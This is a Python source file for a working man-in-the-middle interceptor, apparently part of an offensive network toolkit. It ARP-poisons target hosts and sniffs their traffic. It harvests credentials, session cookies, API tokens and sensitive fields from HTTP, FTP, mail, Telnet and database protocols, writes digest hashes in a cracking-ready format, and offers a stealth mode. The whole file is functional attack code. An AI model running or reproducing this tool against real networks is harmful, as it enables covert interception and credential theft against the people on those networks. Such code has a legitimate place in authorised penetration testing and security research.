"""
MITMInterceptor — ARP spoof + universal cleartext traffic interceptor.
"""

import os
import re
import json
import zlib
import time
import threading
from collections import deque
from datetime import datetime
from typing import Optional, Dict, List, Set

import click
from scapy.all import IP, TCP, UDP, DNS, Raw, sniff, getmacbyip

from .base import BaseMITM
from .constants import (
    SENSITIVE_FIELDS, PROTOCOL_PORTS,
    ENCRYPTED_PORTS, HTTP_PORTS, MAIL_PORTS, DB_PORTS,
    CRED_DISPLAY, EVENT_COLORS, get_event_detail,
)
from .extractors import (
    extract_dns, extract_tls_sni, extract_http,
    extract_ftp, extract_mail, extract_telnet,
    extract_db_proto, extract_netbios_mdns,
)


class MITMInterceptor(BaseMITM):
    """ARP spoof + universal traffic interceptor."""

    def __init__(self, interface: str = "en0", log_dir: str = "./reports/mitm", stealth: bool = False):
        super().__init__(interface, log_dir, stealth)
        self.cred_events: List[dict] = []
        self.packet_count = 0
        self.event_count = 0
        self._log_fh = None
        self._log_file = None

        self.stats = {
            "dns": 0, "http": 0, "credentials": 0, "tls_sni": 0,
            "ftp": 0, "smtp": 0, "sensitive_data": 0, "other": 0,
        }

        # Packet-level dedup (ARP MITM sees each packet twice)
        self._recent_hashes: deque = deque(maxlen=2000)
        self._recent_set: Set[int] = set()

        # Semantic dedup: suppress repeated SNI/DNS within window
        self._seen_sni: Dict[str, float] = {}
        self._seen_dns: Dict[str, float] = {}
        self._dedup_window = 10.0

    # ── Dedup ─────────────────────────────────────────────

    def _is_duplicate(self, pkt) -> bool:
        """Check if we've seen this packet recently (ARP MITM sees each packet twice)."""
        try:
            h = zlib.crc32(bytes(pkt))
            if h in self._recent_set:
                return True
            # Evict oldest BEFORE append to keep set in sync with deque
            if len(self._recent_hashes) == self._recent_hashes.maxlen:
                self._recent_set.discard(self._recent_hashes[0])
            self._recent_hashes.append(h)
            self._recent_set.add(h)
            return False
        except Exception:
            return False

    # ── Packet Handler ────────────────────────────────────

    def _packet_handler(self, pkt):
        self.packet_count += 1

        if self._is_duplicate(pkt):
            return

        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        events = []

        # DNS (UDP)
        if pkt.haslayer(UDP) and pkt.haslayer(DNS):
            ev = extract_dns(pkt, ts, self._seen_dns, self._dedup_window)
            if ev:
                events.append(ev)
                self.stats["dns"] += 1

        # mDNS / LLMNR / NetBIOS
        if pkt.haslayer(UDP):
            ev = extract_netbios_mdns(pkt, ts, self._seen_dns, self._dedup_window)
            if ev:
                events.append(ev)

        # TCP-based protocols
        if pkt.haslayer(TCP) and pkt.haslayer(IP):
            dport = pkt[TCP].dport
            sport = pkt[TCP].sport

            # TLS SNI
            if dport in ENCRYPTED_PORTS:
                ev = extract_tls_sni(pkt, ts, self._seen_sni, self._dedup_window)
                if ev:
                    events.append(ev)
                    self.stats["tls_sni"] += 1

            # HTTP
            if dport in HTTP_PORTS or sport in HTTP_PORTS:
                http_events = extract_http(pkt, ts, self.stats)
                events.extend(http_events)

            # FTP
            if dport == 21 or sport == 21:
                ev = extract_ftp(pkt, ts)
                if ev:
                    events.append(ev)
                    self.stats["ftp"] += 1

            # SMTP / POP3 / IMAP
            if dport in MAIL_PORTS or sport in MAIL_PORTS:
                ev = extract_mail(pkt, ts)
                if ev:
                    events.append(ev)
                    self.stats["smtp"] += 1

            # Telnet
            if dport == 23 or sport == 23:
                ev = extract_telnet(pkt, ts)
                if ev:
                    events.append(ev)

            # Database protocols
            if dport in DB_PORTS or sport in DB_PORTS:
                ev = extract_db_proto(pkt, ts)
                if ev:
                    events.append(ev)

            # Generic cleartext scan
            if (not events and pkt.haslayer(Raw)
                    and dport not in ENCRYPTED_PORTS and sport not in ENCRYPTED_PORTS):
                self._scan_cleartext(pkt, ts, events)

        # Log and display
        for ev in events:
            self.event_count += 1
            self._log_event(ev)
            self._print_event(ev)
            if ev["type"].startswith("cred_") or ev["type"] == "session_cookie":
                self.cred_events.append(ev)

        # Status line every 500 packets
        if self.packet_count % 500 == 0:
            stats_str = " | ".join(f"{k}:{v}" for k, v in self.stats.items() if v > 0)
            click.echo(
                f"\r  [{self.packet_count} pkts | {self.event_count} events | {stats_str}]",
                nl=False,
            )

        # Periodic cleanup (every 5000 packets)
        if self.packet_count % 5000 == 0:
            self._periodic_cleanup()

    def _scan_cleartext(self, pkt, ts: str, events: list):
        """Generic cleartext sensitive data scan for non-standard ports."""
        try:
            raw_bytes = bytes(pkt[Raw].load)
            if raw_bytes and raw_bytes[0] in (0x14, 0x15, 0x16, 0x17):
                return
            payload = raw_bytes.decode("utf-8", errors="ignore")
            sample = payload[:200]
            printable_ratio = sum(
                1 for c in sample if c.isprintable() or c in '\r\n\t'
            ) / max(len(sample), 1)
            if printable_ratio > 0.7 and SENSITIVE_FIELDS.search(payload):
                dport = pkt[TCP].dport
                sport = pkt[TCP].sport
                port_name = PROTOCOL_PORTS.get(
                    dport, PROTOCOL_PORTS.get(sport, f"port-{dport}"))
                sensitive = {}
                for m in re.finditer(
                    r'["\']?(\w+)["\']?\s*[:=]\s*["\']?([^"\'&\s,}{]+)', payload
                ):
                    if SENSITIVE_FIELDS.search(m.group(1)):
                        sensitive[m.group(1)] = m.group(2)[:100]
                if sensitive:
                    events.append({
                        "time": ts, "type": "sensitive_cleartext",
                        "src": f"{pkt[IP].src}:{sport}",
                        "dst": f"{pkt[IP].dst}:{dport}",
                        "protocol": port_name,
                        "fields": sensitive,
                    })
                    self.stats["sensitive_data"] += 1
        except Exception:
            pass

    def _periodic_cleanup(self):
        """Clean up dedup dicts and flush log buffer."""
        now = time.time()
        self._seen_sni = {k: v for k, v in self._seen_sni.items() if now - v < self._dedup_window}
        self._seen_dns = {k: v for k, v in self._seen_dns.items() if now - v < self._dedup_window}
        # Hard cap to prevent unbounded growth
        if len(self._seen_dns) > 10000:
            self._seen_dns.clear()
        if len(self._seen_sni) > 10000:
            self._seen_sni.clear()
        if self._log_fh:
            self._log_fh.flush()

    # ── Display ───────────────────────────────────────────

    def _print_event(self, ev: dict):
        """Pretty-print an intercepted event with color-coding by type."""
        etype = ev["type"]
        ts = ev["time"]

        # Credential box (data-driven dispatch)
        if etype in CRED_DISPLAY:
            click.echo("")
            click.echo(click.style(f"  \u2554\u2550\u2550 {etype.upper()} \u2550\u2550\u2557", fg="red", bold=True))
            click.echo(click.style(f"  \u2551 Time: {ts}", fg="yellow"))
            click.echo(click.style(f"  \u2551 {ev.get('src', '')} \u2192 {ev.get('dst', '')}", fg="yellow"))

            for label, key, color, bold, max_len in CRED_DISPLAY[etype]:
                val = str(ev.get(key, ""))
                if max_len > 0 and len(val) > max_len:
                    val = val[:max_len] + "..."
                click.echo(click.style(f"  \u2551 {label}: {val}", fg=color, bold=bold))

            bottom = "\u2550" * (len(etype) + 8)
            click.echo(click.style(f"  \u255a{bottom}\u255d", fg="red", bold=True))
            return

        # Sensitive data warning box
        if etype.startswith("sensitive_"):
            click.echo("")
            click.echo(click.style(f"  \u26a0 SENSITIVE DATA [{etype}]", fg="red"))
            click.echo(click.style(f"    {ev.get('src', '')} \u2192 {ev.get('dst', '')}", fg="yellow"))
            for k, v in ev.get("fields", {}).items():
                click.echo(click.style(f"    {k}: {v}", fg="red"))
            return

        # One-liner for other events
        fg, bold = "white", False
        for prefix, c, b in EVENT_COLORS:
            if etype.startswith(prefix) or etype == prefix.rstrip("_"):
                fg, bold = c, b
                break

        detail = get_event_detail(ev)
        src = ev.get("src", "")
        click.echo(click.style(
            f"  [{ts}] {etype:<20} {src:<22} {detail}",
            fg=fg, bold=bold,
        ))

    def _log_event(self, ev: dict):
        """Append event to JSONL log (buffered file handle)."""
        if self._log_fh:
            self._log_fh.write(json.dumps(ev) + "\n")

        # Hashcat-compatible digest hashes
        if ev.get("type") == "cred_digest" and all(
            ev.get(k) for k in ["username", "realm", "nonce", "uri", "response"]
        ):
            hashfile = os.path.join(self.log_dir, "digest_hashes.txt")
            with open(hashfile, "a") as f:
                f.write(
                    f"$digest${ev['username']}$"
                    f"{ev['realm']}${ev['nonce']}$"
                    f"{ev['uri']}${ev['response']}\n"
                )

    # ── Main Entry ────────────────────────────────────────

    def start(
        self,
        target: Optional[str] = None,
        gateway: Optional[str] = None,
        gateway_mac: Optional[str] = None,
        network: Optional[str] = None,
        bpf_filter: Optional[str] = None,
    ):
        """Start MITM interception."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self._log_file = os.path.join(self.log_dir, f"mitm_{timestamp}.jsonl")
        self._log_fh = open(self._log_file, "a", buffering=8192)

        from scapy.all import get_if_addr, get_if_hwaddr
        self.our_ip = get_if_addr(self.interface)
        self.our_mac = get_if_hwaddr(self.interface)

        click.echo(click.style("\n  \u250c\u2500 MITM Universal Interceptor \u2500\u2510", fg="cyan", bold=True))
        click.echo(f"  \u2502 Interface: {self.interface}")
        click.echo(f"  \u2502 Our IP:    {self.our_ip} ({self.our_mac})")

        if not gateway:
            gateway = self._detect_gateway()
        self.gateway_ip = gateway

        # Try to get gateway MAC: manual > ARP cache > scapy getmacbyip
        if gateway_mac:
            self.gateway_mac = gateway_mac
        else:
            self.gateway_mac = self._get_mac_from_arp_cache(gateway)
            if not self.gateway_mac:
                self.gateway_mac = getmacbyip(gateway)
        if not self.gateway_mac:
            click.echo(click.style(f"  \u2502 ERROR: Cannot resolve gateway {gateway}", fg="red"))
            click.echo(click.style("  \u2502        Try: arp -a  # to see available gateways", fg="yellow"))
            click.echo(click.style(f"  \u2502        Then: hot net mitm -S -g {gateway} --gateway-mac <MAC>", fg="yellow"))
            return
        click.echo(f"  \u2502 Gateway:   {self.gateway_ip} ({self.gateway_mac})")

        if target:
            mac = getmacbyip(target)
            if mac:
                self.targets = {target: mac}
            else:
                click.echo(click.style(f"  \u2502 ERROR: Cannot resolve target {target}", fg="red"))
                return
        else:
            self.targets = self._discover_targets(network)

        click.echo(f"  \u2502 Targets:   {len(self.targets)} hosts")
        for ip, mac in self.targets.items():
            click.echo(f"  \u2502   {ip} ({mac})")
        if self.stealth:
            click.echo(click.style("  \u2502 Mode:      STEALTH (jittered 5-15s, batched)", fg="yellow", bold=True))
        click.echo(f"  \u2502 Log:       {self._log_file}")
        click.echo(click.style("  \u2502", fg="cyan"))
        click.echo(click.style("  \u2502 Decoders:", fg="cyan"))
        click.echo("  \u2502   HTTP (requests, responses, headers, bodies)")
        click.echo("  \u2502   Auth (Digest, Basic, Bearer, NTLM, Form POST)")
        click.echo("  \u2502   DNS (queries, responses)")
        click.echo("  \u2502   TLS (SNI extraction)")
        click.echo("  \u2502   FTP / SMTP / POP3 / IMAP (credentials)")
        click.echo("  \u2502   Telnet (cleartext)")
        click.echo("  \u2502   Database (MySQL, PostgreSQL, Redis, MongoDB)")
        click.echo("  \u2502   mDNS / LLMNR / NetBIOS")
        click.echo("  \u2502   JSON sensitive field detection")
        click.echo("  \u2502   Cookies / API tokens / session tokens")
        click.echo(click.style("  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n", fg="cyan", bold=True))

        if not self.targets:
            click.echo(click.style("  No targets found!", fg="red"))
            return

        click.echo("  Enabling IP forwarding ...")
        self._enable_forwarding()

        self.running = True
        self._poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
        self._poison_thread.start()
        click.echo(click.style("  ARP poisoning active", fg="green", bold=True))

        if not bpf_filter:
            bpf_filter = f"not host {self.our_ip}"

        click.echo(f"  Filter: {bpf_filter[:80]}...")
        click.echo(click.style(
            "\n  Intercepting ALL traffic... (Ctrl+C to stop)\n",
            fg="yellow", bold=True,
        ))

        try:
            sniff(
                iface=self.interface,
                filter=bpf_filter,
                prn=self._packet_handler,
                store=0,
            )
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def stop(self):
        """Stop MITM and restore ARP."""
        self.running = False
        if self._poison_thread:
            self._poison_thread.join(timeout=3)

        self._restore_arp()
        self._disable_forwarding()

        # Close log file handle
        if self._log_fh:
            self._log_fh.flush()
            self._log_fh.close()
            self._log_fh = None

        # Summary
        click.echo(click.style("\n  \u250c\u2500 MITM Summary \u2500\u2510", fg="cyan", bold=True))
        click.echo(f"  \u2502 Packets:     {self.packet_count}")
        click.echo(f"  \u2502 Events:      {self.event_count}")
        click.echo(f"  \u2502 Log:         {self._log_file}")
        click.echo(click.style("  \u2502 Breakdown:", fg="cyan"))
        for k, v in self.stats.items():
            if v > 0:
                click.echo(f"  \u2502   {k}: {v}")
        hashfile = os.path.join(self.log_dir, "digest_hashes.txt")
        if os.path.exists(hashfile):
            click.echo(f"  \u2502 Hashes:      {hashfile}")
        click.echo(click.style("  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n", fg="cyan", bold=True))

        if self.cred_events:
            click.echo(click.style(
                f"  Credentials captured ({len(self.cred_events)}):", fg="red", bold=True))
            for c in self.cred_events:
                summary = c.get("credentials", c.get("username", c.get("token", c.get("cookie", ""))))
                if isinstance(summary, str):
                    summary = summary[:60]
                click.echo(f"    [{c['time']}] {c['type']}: {summary}")
